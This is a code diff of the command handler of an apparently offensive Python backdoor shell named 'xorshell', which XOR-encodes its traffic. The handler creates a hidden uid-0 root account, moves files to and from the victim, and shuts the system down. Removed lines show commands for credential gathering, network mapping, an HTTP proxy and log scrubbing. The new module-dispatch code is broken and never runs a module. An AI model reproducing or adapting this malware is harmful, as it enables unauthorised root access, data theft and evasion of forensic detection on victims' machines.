@@ -58,11 +58,6 @@ def xorshell():
             os.system("/usr/sbin/useradd -M -o -s /bin/bash -u 0 -l " + acct)
             conn.send(xor("[+] Root account " + acct + " has been created.\n", PKEY)) 
 
-        elif cmd2 == ("httproxy"):
-            httpd = SocketServer.ForkingTCPServer(('', PPORT), Proxy)
-            conn.send(xor("[+] Serving HTTP proxy on port "+ PPORT +"", PKEY))
-            httpd.serve_forever()  
-
         elif cmd2.startswith('upload'):
             getname = cmd2.split(" ")
             rem_file = getname[1]
@@ -76,6 +71,7 @@ def xorshell():
                 conn.send(xor("[+] File upload complete!", PKEY))
             if not os.path.isfile(filename):
                 conn.send(xor("[!] File upload failed! Please try again", PKEY))
+
         elif cmd2.startswith('download'):
             getname = cmd2.split(" ")
             loc_file = getname[1]
@@ -87,42 +83,30 @@ def xorshell():
                 conn.sendall(senddata)
             else:
                 conn.send(xor("[+] File not found!", PKEY))
+
         elif cmd2.startswith("rebootsys"):
             conn.send(xor("[!] Server system is going down for a reboot!", PKEY))
             os.system("shutdown -h now")
-        elif cmd2 == ("extask osinfo"):
-            Gather_OS()
-            conn.send(xor("\n[+] OS Info Gathering complete.", PKEY))
-            conn.send(xor("\n[+] Reports located in: %s " % Temp_Dir, PKEY))
+
+        elif cmd2 == ("extask"):
+            conn.send(xor(str(modList), PKEY))
             conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))
-        elif cmd2 == ("extask network"):
-            NetworkInfo()
-            conn.send(xor("\n[+] Network Gather complete.", PKEY))
-            conn.send(xor("\n[+] Reports located in: %s " % Temp_Dir, PKEY))
-            conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))
-        elif cmd2 == ("extask credentials"):
-            GetCredentials()
-            conn.send(xor("\n[+] Credentials Gather complete.", PKEY))
-            conn.send(xor("\n[+] Reports located in: %s " % Temp_Dir, PKEY))
-            conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))
-        elif cmd2 == ("extask livehosts"):
-            NetworkMap()
-            conn.send(xor("\n[+] Network Map complete.", PKEY))
-            conn.send(xor("\n[+] Reports located in: %s " % Temp_Dir, PKEY))
-            conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))
-        elif cmd2 == ("extask findextras"):
-            FindExtras()
-            conn.send(xor("\n[+] Extras Gather complete.", PKEY))
-            conn.send(xor("\n[+] Reports located in: %s " % Temp_Dir, PKEY))
-            conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))
-        elif cmd2 == ("extask scrub"):
-            ScrubLog()
-            conn.send(xor("\n[+] Scrubbing complete.", PKEY))
-            conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))
+
+        elif cmd2.startswith("extask"):
+            getname = cmd.split(" ")
+            modname = getname[1]
+            if modname in modList is False:
+                conn.send(xor("[!] Module not loaded!", PKEY))
+            else:
+                conn.send(xor("[+] Executing %s " % modname, PKEY))
+                execmod = modname+"()"
+                execmod
+
         elif cmd2 == ('killme'):
             conn.send(xor("[!] Shutting down shell!\n", PKEY))
             conn.close()
             sys.exit(0)
+
         elif proc:
             conn.send(xor( stdout , PKEY))
             conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))
